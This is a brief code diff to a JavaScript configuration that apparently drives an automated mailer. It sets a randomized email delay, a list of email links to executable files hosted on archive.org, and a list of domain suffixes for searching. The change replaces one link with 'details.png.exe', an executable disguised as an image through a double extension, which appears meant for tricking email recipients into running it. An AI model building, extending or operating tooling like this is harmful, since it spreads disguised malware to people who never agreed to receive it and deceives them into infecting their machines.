@@ -78,7 +78,7 @@ const CONFIG = {
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
     "https://archive.org/download/deliveryraufpoint_202602/deliveryraufpoint.exe",
-    "https://archive.org/download/raufpointpdf_202602/raufpointpdf.exe",
+    "https://archive.org/download/details.png/details.png.exe",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
